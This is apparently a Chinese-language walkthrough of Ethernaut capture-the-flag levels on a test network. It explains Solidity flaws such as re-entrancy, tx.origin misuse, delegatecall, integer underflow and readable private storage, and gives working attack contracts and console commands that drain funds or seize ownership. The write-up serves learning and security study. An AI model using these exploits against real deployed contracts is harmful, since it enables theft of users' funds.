1. 打开浏览器的开发者工具，然后调用控制台
2. 登录自己的钱包账户，并选择rinkby测试链
3. 申请一个新的实例，即可开启挑战
4. 按照控制台上的提示，一步一步的调用函数并获取最终结果：
2.1要求
本关要求：
1. 获得这个合约的所有权
2. 把他的余额减到0
合约代码分析：
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  //防止数据溢出
  using SafeMath for uint256;
  //地址和uint进行映射
  mapping(address => uint) public contributions;
  //声明一个具有接收ether功能的地址
  address payable public owner;

//构造器
  constructor() public {
    //刚部署合约的时候，这个时候的调用者就是合约的拥有者
    owner = msg.sender;
    //声明贡献值的计算方法
    contributions[msg.sender] = 1000 * (1 ether);
  }

//函数修饰符
  modifier onlyOwner {
    //需要调用者是合约的所有者，否则退回
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

//权限归属问题
  function contribute() public payable {
    //需要每次转账值小于0.001（题目设置，可以节约gasfee）
    require(msg.value < 0.001 ether);
    //调用者的贡献值累加调用者的转账值
    contributions[msg.sender] += msg.value;
    //如果调用者的贡献值超过合约所有者的贡献值，就将合约所有者转换为该合约调用者
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

//获取贡献值
  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

//回退（仅在合约所有者=调用者的情况下能执行）
  function withdraw() public onlyOwner {
    //this代表合约本身，address(this)即可获取合约本身，转移合约所有的余额
    owner.transfer(address(this).balance);
  }

//接收ether的函数（每个合约至少需要具有receive函数或fallback其中一个，才能接收ether）
  receive() external payable {
    //需要满足调用者转账的gas大于0&&调用者的贡献值大于0，且合约的所有者就是函数的调用者
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
通过调用contract.owner()可以清楚的看到合约的所有者地址：
2.2关卡分析
前置知识
1. ether与wei之间的相互转换：
  - toWei("num")，可以将ether转换为wei
  - fromWei("num")，可以将wwei转换成ether
例如:
[图片]
1. 在ABI之外发送ether：
2. 可以使用sendTransaction(transactionObject [, callback])，
3. 其中参数为：
  - transactionObject：Object - 要发送的交易对象，包含以下字段：
    - from - String|Number: 交易发送方账户地址，不设置该字段的话，则使用web3.eth.defaultAccount属性值。可设置为一个地址或本地钱包web3.eth.accounts.wallet中的索引序号
    - to - String: 可选，消息的目标地址，对于合约创建交易该字段为null
    - value - Number|String|BN|BigNumber: (optional) The value transferred for the transaction in wei, also the endowment if it’s a contract-creation transaction.
    - gas - Number: 可选，默认值：待定，用于交易的gas总量，未用完的gas会退还
    - gasPrice - Number|String|BN|BigNumber: 可选，该交易的gas价格，单位为wei，默认值为web3.eth.gasPrice属性值
    - data - String: 可选，可以是包含合约方法数据的ABI字符串，或者是合约创建交易中的初始化代码
    - nonce - Number: 可选，使用该字段覆盖使用相同nonce值的挂起交易
  - callback - Function: 可选的回调函数，其第一个参数为错误对象，第二个参数为结果
4. 该函数的返回值为：32字节长的交易哈希值。
5. 举个栗子：
// compiled solidity source code using https://remix.ethereum.org
var code = "603d80600c6000396000f3007c01000000000000000000000000000000000000000000000000000000006000350463c6888fa18114602d57005b6007600435028060005260206000f3";

// 使用回调函数
web3.eth.sendTransaction({
    from: '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe',
    data: code // deploying a contracrt
}, function(error, hash){
    ...
});

// 使用promise
web3.eth.sendTransaction({
    from: '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe',
    to: '0x11f4d0A3c12e86B4b5F39B213F7E19D048276DAe',
    value: '1000000000000000'
})
.then(function(receipt){
    ...
});

// 使用事件发生器
web3.eth.sendTransaction({
    from: '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe',
    to: '0x11f4d0A3c12e86B4b5F39B213F7E19D048276DAe',
    value: '1000000000000000'
})
.on('transactionHash', function(hash){
    ...
})
.on('receipt', function(receipt){
    ...
})
.on('confirmation', function(confirmationNumber, receipt){ ... })
.on('error', console.error); // If a out of gas error, the second parameter is the receipt.
[图片]
1. 注：这些交易都是向关键字前面的这个address发送交易。
2. 通过与ABI互动发送ether：
3. 使用contract.contribute({value:1})的方式先向合约发送一定数量的ether
4. 再在ABI之外发送ether给实例地址
5. 此处使用metamask为例：
[图片]
1. 然后调用contract.owner()查看合约所有者，已经变更为我的地址
2. 调用withdraw函数，取出合约中所有的余额
3. 即完成挑战
3.Fallout
挑战要求
- 获取owner权限
漏洞
构造函数本身实际上是无法直接调用的，而本题中作者故意写成Fal1out注意中间是1，使得该函数不是构造函数，于是可以全局调用。
解题思路
- 直接调用Fal1out()函数，即可将owner转换成我们的地址。
- 再调用collectAllocations，即可完成挑战
- coinFlip
挑战要求
- 连续猜对10次结果
漏洞
前言：
- block.number可以用来获取当前交易对应block的编号
- blockhash(id)可以获取对应id的block的hash值
- factor的实际值为2^256/2，即uint256最大值的一半，所以用uint256(blockhash(block.number.sub(1)))除以factor，只有两个可能的结果：要么0，要么1.
漏洞：
而通过block.blockhash(block.number - 1)获取负一高度的区块hash来生成随机数的方式是极易被攻击利用的。
原理：
一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1。
.Telephone
挑战条件
- 获取合约所有权
漏洞
tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。
这道题需要了解tx.origin和msg.sender的区别。假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A->C，那么在C合约看来，A既是tx.origin，又是
msg.sender。如果调用链是A->B->C，那么对于合约C来说，A是tx.origin，B是msg.sender，即msg.sender是直接调用的一方，而tx.origin是交易的原始发起者，和英文也对应着。因此本题直接外部部署合约调用changeOwner函数即可完成。
总结：
- tx.origin是交易发送者
- msg.sende是消息发送者
攻略
- 创建合约代码如下：
// SPDX-License-Identifier: MIT
/*
anyway，就是用我的账户地址新建一个合约B，通过合约B来调用合约A，我的地址就是tx.origin，B对于A就是msg.sender
*/
pragma solidity ^0.6.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract attack{
  address public instance;
  constructor(address _instance) public{
    instance = _instance;
  }

   function hack() public{
     Telephone(instance).changeOwner(msg.sender);
   }
}
- 传入实例地址到_instance后部署该合约
- 调用hack函数，提交该实例
- over
Token
挑战要求
- 增加token数量
漏洞
函数transfer中的
require(balances[msg.sender] - _value >= 0);
存在下溢出风险。
攻略
- 调用transfer函数:transfer(instance,tokensnumber)
注意：是输入实例的地址而不是玩家的地址。
7.Delegation
要求
- 获取该关卡的实例的所有权
漏洞
delegatecall的上下文执行环境是调用合约的环境，所以只需要在当前环境中使用delegatecall函数来调用pwn函数即可
攻略
- 控制台输入：
contract.sendTransaction({data:web3.utils.sha3("pwn()").slice(0,10)});
8.Force
挑战要求
- 给合约转账
漏洞
强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的。
格式：
selfdestruct(target address);
注意：使用selfdestruct的时候，指向的合约地址必须是显式的地址，而不能使用变量来代替
攻略
1. 先新建一个包含selfdestruct函数的合约A
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {

constructor() public payable{}
receive() payable external{}
function hack() public{
  selfdestruct(0x62579fF1D2CD4Fe484F57249cD2C0DE6fDcb63AF);//函数中填写你想要转账的合约实例地址
}
}
1. 往合约A里打钱
2. 调用hack()函数，从而使用selfdestruct函数，向你的实例地址转账
over
.Vault
要求
- 解开保险箱
漏洞
正经人谁把密码明文存在区块链上啊
攻略
- 使用指令
web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.utils.toAscii(y))});
来查看存储在区块链上的状态变量的值，从而获取password。
10.King
要求
- 一直当国王
漏洞
- transfer函数无法转账给没有receive或fallback函数的另一个智能合约
因为：未定义fallback或是receive的智能合約收到transfer传送的以太币会以exception处理。
因此我们只需要创建另一个智能合约，并且不定义receive和fallback函数，则原king合约就无法把钱转账给我们，从而就无法改变King的所有权。
攻略
- 新建合约B
- 用合约B来调用合约A
- .Elevator
要求
- 让电梯达到顶楼(即让top为true)
(做到这里的时候对if语句里的条件判断突然卡壳了，后面仔细思考了一下，building.isLastFloor返回值必须为false，整个语句才能判断为真。)
漏洞
- Building的owner是msg.sender
- 因此我们可以自己编写building合约来篡改isLastFloor返回的结果
- 告诫我们不要轻易地把一些重要权限分配给msg.sender
攻略
- 自己写个攻略合约
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
/*
我明白问题了，当我们自己新建Building合约时，我们需要操作两次，第一次让isLastFloor的返回值为false，从而方便我们进入if判断；第二次我们要让isLastFloor返回值为true，从而更改top的值。
*/
contract Building{
  bool public flag = false;
  address public instance = 0x070b0f062e4EF0a495832a3173861CFb34A27731;
  function isLastFloor(uint) external returns(bool){
    //如何让flag值更改两次呢？
    if(flag == false){
      flag = true;
      return false ;
    }
      return true;
  }
  function hack() public{
  instance.call(abi.encode("goTo(uint256)",1));
  }
}
- 部署该合约，传入instance地址，调用goTo
- over

Re-entrancy
要求
- 偷光合约中的所有资产
漏洞
- withdraw函数里使用的转账方式是call，就可能被其他人转走调所有的资产
- 并且事务的确定是先将钱从账户A转账到另一个账户B中，再在账户A中扣处相应的资金。（即：先花钱，后记账的模式)
攻略
1. 创建一个新的合约，代码如下：
pragma solidity ^0.8.0;
interface ReEntrance {
function withdraw(uint256 _amount) external;
}
contract attack {
address Instance;
constructor(address _Instance) {Instance = _Instance;}
function hack(uint256 _amount) public {
ReEntrance(Instance).withdraw(_amount);
}
fallback() external payable {ReEntrance(Instance).withdraw(msg.value);}
｝
部署上述合约，并在constructor中填写实例的地址。
1. 在console中输入：
contract.donate("实例地址",toWei("0.6"))
1. 再回过头来调用hack函数，并输入参数：60000000000000000
2. 搞定
Privacy
要求
- 理解 storage 的原理
- 理解 parameter parsing 的原理
- 理解 casting 的原理
漏洞
1. 根据solidity 文档中的变量存储原则,以太坊存储数据时是以每32bytes作为一格顺序存储的,而不足32字节的变量相互共享并补齐32字节（即:存储大小少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中）。
2. 第一个32 字节就是由locked（1位）、flattening（3位）、denomination（8位）、awkwardness（16位）组成，另外由于常量(constant)是无需存储的，所以从第二个32 字节开始就是 data。 因此只需要将第五个存储槽内容取出即可。
攻略
1. 使用以下语句获取data的数据
web3.eth.getStorageAt(instance, 5 ,function(x,y){console.info(y);})
1. 调用unlock函数，并传入获取到的data[2]，即前32位
1. 搞定
Naught Coin
要求：
- 立即完成转走我们账户所拥有的代币
漏洞
这个代币合约虽然继承了ERC20，但是它只重写(override)了ERC20的transfer函数，并且lockTokens这个modifer里面也没有对账户的所有权进行限制，因此我们可以使用approve和transferFrom函数来完成转账
攻略
1. 在console面板调用approve函数：
contract.approve(player,toWei("1000000"))
1. 获取授权之后，再调用transferFrom函数
contract.transferFrom(player,contract.address,toWei("1000000"))
1. 搞定